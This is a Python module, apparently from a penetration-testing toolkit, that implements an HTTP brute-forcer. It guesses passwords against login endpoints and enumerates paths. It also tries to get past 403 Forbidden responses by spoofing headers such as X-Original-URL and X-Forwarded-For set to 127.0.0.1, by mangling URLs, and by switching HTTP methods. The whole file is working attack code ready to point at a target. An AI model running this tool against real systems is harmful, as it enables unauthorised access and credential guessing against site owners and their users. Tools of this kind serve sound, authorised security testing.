#!/usr/bin/env python3
"""
HTTP Brute-forcing with 403 Bypass
-----------------------------------
HTTP Brute-forcing module with 403 Forbidden bypass techniques
- Multiple HTTP methods support (GET, POST, PUT, DELETE, etc.)
- 403 bypass techniques (Apache tricks, header manipulation)
- Dictionary-based payload generation
- Progress tracking and detailed logging
- Configurable options for target URL, headers, proxies, wordlists

Author: kArmasec
"""

import requests
import logging
import time
from typing import Dict, List, Optional, Tuple
from tqdm import tqdm
from urllib.parse import urlparse, urlunparse

# Configure logging
log = logging.getLogger("http_bruteforce")


class HTTPBruteForcer:
    """HTTP Brute-forcing class with 403 bypass capabilities"""

    # 403 Bypass techniques
    @staticmethod
    def _apache_double_slash(url: str) -> str:
        """Add double slash after protocol in URL path"""
        parsed = urlparse(url)
        if parsed.path and parsed.path != '/':
            # Replace first slash in path with double slash
            new_path = parsed.path.replace('/', '//', 1)
            return urlunparse((parsed.scheme, parsed.netloc, new_path, 
                             parsed.params, parsed.query, parsed.fragment))
        return url + '//'

    BYPASS_METHODS = {
        "apache_dot": lambda url: url + "/.",
        "apache_double_slash": lambda url: HTTPBruteForcer._apache_double_slash(url),
        "trailing_slash": lambda url: url + "/" if not url.endswith("/") else url,
    }

    BYPASS_HEADERS = [
        {"X-Original-URL": ""},
        {"X-Rewrite-URL": ""},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
    ]

    def __init__(
        self,
        target_url: str,
        wordlist: Optional[List[str]] = None,
        methods: Optional[List[str]] = None,
        headers: Optional[Dict[str, str]] = None,
        proxies: Optional[Dict[str, str]] = None,
        timeout: int = 10,
        max_retries: int = 3,
        delay: float = 0,
        verbose: bool = False,
        enable_bypass: bool = True,
        success_codes: Optional[List[int]] = None,
    ):
        """
        Initialize HTTP Brute-forcer

        Args:
            target_url: Target URL to brute-force
            wordlist: List of payloads/credentials to try
            methods: HTTP methods to use (default: ['GET', 'POST'])
            headers: Custom headers to include
            proxies: Proxy configuration {'http': '...', 'https': '...'}
            timeout: Request timeout in seconds
            max_retries: Maximum number of retries per request
            delay: Delay between requests in seconds
            verbose: Enable verbose logging
            enable_bypass: Enable 403 bypass techniques
            success_codes: HTTP status codes considered successful (default: [200, 201, 202, 301, 302])
        """
        self.target_url = target_url
        self.wordlist = wordlist or []
        self.methods = methods or ["GET", "POST"]
        self.headers = headers or {}
        self.proxies = proxies
        self.timeout = timeout
        self.max_retries = max_retries
        self.delay = delay
        self.verbose = verbose
        self.enable_bypass = enable_bypass
        self.success_codes = success_codes or [200, 201, 202, 301, 302]
        
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        
        self.results = {
            "successful": [],
            "failed": [],
            "bypassed_403": [],
        }

        if self.verbose:
            log.setLevel(logging.DEBUG)
        else:
            log.setLevel(logging.INFO)

    def _apply_bypass_technique(self, url: str, technique: str) -> str:
        """Apply a specific bypass technique to the URL"""
        if technique in self.BYPASS_METHODS:
            return self.BYPASS_METHODS[technique](url)
        return url

    def _make_request(
        self,
        url: str,
        method: str = "GET",
        data: Optional[Dict] = None,
        additional_headers: Optional[Dict[str, str]] = None,
    ) -> Tuple[Optional[requests.Response], Optional[Exception]]:
        """
        Make HTTP request with retry logic

        Returns:
            Tuple of (response, error)
        """
        headers = self.headers.copy()
        if additional_headers:
            headers.update(additional_headers)

        for attempt in range(self.max_retries):
            try:
                if method.upper() == "GET":
                    response = self.session.get(
                        url,
                        headers=headers,
                        proxies=self.proxies,
                        timeout=self.timeout,
                        allow_redirects=False,
                    )
                elif method.upper() == "POST":
                    response = self.session.post(
                        url,
                        data=data,
                        headers=headers,
                        proxies=self.proxies,
                        timeout=self.timeout,
                        allow_redirects=False,
                    )
                elif method.upper() == "PUT":
                    response = self.session.put(
                        url,
                        data=data,
                        headers=headers,
                        proxies=self.proxies,
                        timeout=self.timeout,
                        allow_redirects=False,
                    )
                elif method.upper() == "DELETE":
                    response = self.session.delete(
                        url,
                        headers=headers,
                        proxies=self.proxies,
                        timeout=self.timeout,
                        allow_redirects=False,
                    )
                elif method.upper() == "HEAD":
                    response = self.session.head(
                        url,
                        headers=headers,
                        proxies=self.proxies,
                        timeout=self.timeout,
                        allow_redirects=False,
                    )
                elif method.upper() == "OPTIONS":
                    response = self.session.options(
                        url,
                        headers=headers,
                        proxies=self.proxies,
                        timeout=self.timeout,
                        allow_redirects=False,
                    )
                elif method.upper() == "PATCH":
                    response = self.session.patch(
                        url,
                        data=data,
                        headers=headers,
                        proxies=self.proxies,
                        timeout=self.timeout,
                        allow_redirects=False,
                    )
                else:
                    log.warning(f"Unsupported method: {method}")
                    return None, Exception(f"Unsupported method: {method}")

                return response, None

            except requests.exceptions.RequestException as e:
                if attempt < self.max_retries - 1:
                    log.debug(f"Retry {attempt + 1}/{self.max_retries} for {url}: {e}")
                    time.sleep(1)
                else:
                    return None, e

        return None, Exception("Max retries reached")

    def _try_bypass_403(self, url: str, method: str = "GET") -> Optional[Dict]:
        """
        Try various 403 bypass techniques

        Returns:
            Dict with bypass result if successful, None otherwise
        """
        if not self.enable_bypass:
            return None

        log.info(f"Attempting 403 bypass techniques for {url}")

        # Try URL manipulation techniques
        for technique_name, technique_func in self.BYPASS_METHODS.items():
            if self.delay:
                time.sleep(self.delay)

            modified_url = technique_func(url)
            response, error = self._make_request(modified_url, method)

            if response and response.status_code in self.success_codes:
                log.info(f"✓ Bypass successful with {technique_name}: {modified_url}")
                return {
                    "url": modified_url,
                    "method": method,
                    "technique": technique_name,
                    "status_code": response.status_code,
                    "content_length": len(response.content),
                }

        # Try header manipulation
        for bypass_header in self.BYPASS_HEADERS:
            if self.delay:
                time.sleep(self.delay)

            # Set the header value to the original path using urllib.parse
            header_key = list(bypass_header.keys())[0]
            try:
                parsed_url = urlparse(url)
                path = parsed_url.path if parsed_url.path else "/"
                header_with_value = {header_key: path}
            except Exception as e:
                log.debug(f"Failed to parse URL for header bypass: {e}")
                continue

            response, error = self._make_request(url, method, additional_headers=header_with_value)

            if response and response.status_code in self.success_codes:
                log.info(f"✓ Bypass successful with header {header_key}: {url}")
                return {
                    "url": url,
                    "method": method,
                    "technique": f"header_{header_key}",
                    "status_code": response.status_code,
                    "content_length": len(response.content),
                    "header": header_with_value,
                }

        # Try alternative HTTP methods
        alt_methods = ["POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
        for alt_method in alt_methods:
            if alt_method == method:
                continue

            if self.delay:
                time.sleep(self.delay)

            response, error = self._make_request(url, alt_method)

            if response and response.status_code in self.success_codes:
                log.info(f"✓ Bypass successful with method {alt_method}: {url}")
                return {
                    "url": url,
                    "method": alt_method,
                    "technique": f"method_{alt_method}",
                    "status_code": response.status_code,
                    "content_length": len(response.content),
                }

        return None

    def brute_force(self, username: Optional[str] = None, password_list: Optional[List[str]] = None) -> Dict:
        """
        Perform brute-force attack

        Args:
            username: Optional username for authentication
            password_list: Optional password list (uses wordlist if not provided)

        Returns:
            Dictionary containing results
        """
        payloads = password_list if password_list else self.wordlist
        
        if not payloads:
            log.warning("No payloads provided for brute-forcing")
            return self.results

        log.info(f"Starting brute-force on {self.target_url}")
        log.info(f"Methods: {self.methods}")
        log.info(f"Payloads: {len(payloads)}")
        log.info(f"403 Bypass: {'Enabled' if self.enable_bypass else 'Disabled'}")

        total_attempts = len(payloads) * len(self.methods)
        
        with tqdm(total=total_attempts, desc="Brute-forcing", unit="req") as pbar:
            for method in self.methods:
                for payload in payloads:
                    if self.delay:
                        time.sleep(self.delay)

                    # Construct request data
                    data = None
                    test_url = self.target_url
                    
                    if username:
                        # For authentication endpoints
                        if method.upper() in ["POST", "PUT", "PATCH"]:
                            data = {"username": username, "password": payload}
                        else:
                            # Try basic auth or URL parameters
                            test_url = f"{self.target_url}?username={username}&password={payload}"
                    else:
                        # For path/endpoint testing
                        if not self.target_url.endswith("/"):
                            test_url = self.target_url + "/" + payload
                        else:
                            test_url = self.target_url + payload

                    # Make the request
                    response, error = self._make_request(test_url, method, data)

                    if error:
                        log.debug(f"Request failed: {test_url} - {error}")
                        self.results["failed"].append({
                            "url": test_url,
                            "method": method,
                            "payload": payload,
                            "error": str(error),
                        })
                    elif response:
                        status_code = response.status_code
                        
                        if status_code in self.success_codes:
                            log.info(f"✓ Success [{status_code}]: {test_url} with {method}")
                            self.results["successful"].append({
                                "url": test_url,
                                "method": method,
                                "payload": payload,
                                "status_code": status_code,
                                "content_length": len(response.content),
                            })
                        elif status_code == 403 and self.enable_bypass:
                            # Try bypass techniques
                            bypass_result = self._try_bypass_403(test_url, method)
                            if bypass_result:
                                self.results["bypassed_403"].append(bypass_result)
                        else:
                            log.debug(f"Response [{status_code}]: {test_url}")

                    pbar.update(1)

        log.info(f"Brute-force completed: {len(self.results['successful'])} successful, "
                 f"{len(self.results['bypassed_403'])} bypassed 403, "
                 f"{len(self.results['failed'])} failed")

        return self.results

    def scan_endpoints(self, endpoint_list: List[str]) -> Dict:
        """
        Scan multiple endpoints for accessibility

        Args:
            endpoint_list: List of endpoints/paths to scan

        Returns:
            Dictionary containing results
        """
        log.info(f"Starting endpoint scan on {self.target_url}")
        log.info(f"Endpoints to scan: {len(endpoint_list)}")

        total_attempts = len(endpoint_list) * len(self.methods)
        
        with tqdm(total=total_attempts, desc="Scanning endpoints", unit="req") as pbar:
            for method in self.methods:
                for endpoint in endpoint_list:
                    if self.delay:
                        time.sleep(self.delay)

                    # Construct full URL
                    if endpoint.startswith("/"):
                        test_url = self.target_url.rstrip("/") + endpoint
                    else:
                        test_url = self.target_url.rstrip("/") + "/" + endpoint

                    # Make the request
                    response, error = self._make_request(test_url, method)

                    if error:
                        log.debug(f"Request failed: {test_url} - {error}")
                        self.results["failed"].append({
                            "url": test_url,
                            "method": method,
                            "endpoint": endpoint,
                            "error": str(error),
                        })
                    elif response:
                        status_code = response.status_code
                        
                        if status_code in self.success_codes:
                            log.info(f"✓ Accessible [{status_code}]: {test_url} with {method}")
                            self.results["successful"].append({
                                "url": test_url,
                                "method": method,
                                "endpoint": endpoint,
                                "status_code": status_code,
                                "content_length": len(response.content),
                            })
                        elif status_code == 403 and self.enable_bypass:
                            # Try bypass techniques
                            bypass_result = self._try_bypass_403(test_url, method)
                            if bypass_result:
                                bypass_result["endpoint"] = endpoint
                                self.results["bypassed_403"].append(bypass_result)
                        else:
                            log.debug(f"Response [{status_code}]: {test_url}")

                    pbar.update(1)

        log.info(f"Endpoint scan completed: {len(self.results['successful'])} accessible, "
                 f"{len(self.results['bypassed_403'])} bypassed 403, "
                 f"{len(self.results['failed'])} failed")

        return self.results

    def get_results_summary(self) -> str:
        """Get a formatted summary of results"""
        summary = "\n" + "=" * 60 + "\n"
        summary += "HTTP BRUTE-FORCE RESULTS SUMMARY\n"
        summary += "=" * 60 + "\n\n"

        summary += f"Target: {self.target_url}\n"
        summary += f"Methods tested: {', '.join(self.methods)}\n"
        summary += f"403 Bypass: {'Enabled' if self.enable_bypass else 'Disabled'}\n\n"

        summary += f"Successful requests: {len(self.results['successful'])}\n"
        summary += f"Bypassed 403: {len(self.results['bypassed_403'])}\n"
        summary += f"Failed requests: {len(self.results['failed'])}\n\n"

        if self.results["successful"]:
            summary += "SUCCESSFUL REQUESTS:\n"
            summary += "-" * 60 + "\n"
            for result in self.results["successful"][:10]:  # Show first 10
                summary += f"  [{result.get('status_code')}] {result.get('method')} {result.get('url')}\n"
            if len(self.results["successful"]) > 10:
                summary += f"  ... and {len(self.results['successful']) - 10} more\n"
            summary += "\n"

        if self.results["bypassed_403"]:
            summary += "403 BYPASSED:\n"
            summary += "-" * 60 + "\n"
            for result in self.results["bypassed_403"]:
                summary += f"  [{result.get('status_code')}] {result.get('method')} {result.get('url')}\n"
                summary += f"    Technique: {result.get('technique')}\n"
            summary += "\n"

        summary += "=" * 60 + "\n"
        return summary


def load_wordlist(filepath: str) -> List[str]:
    """Load wordlist from file"""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        log.error(f"Failed to load wordlist {filepath}: {e}")
        return []
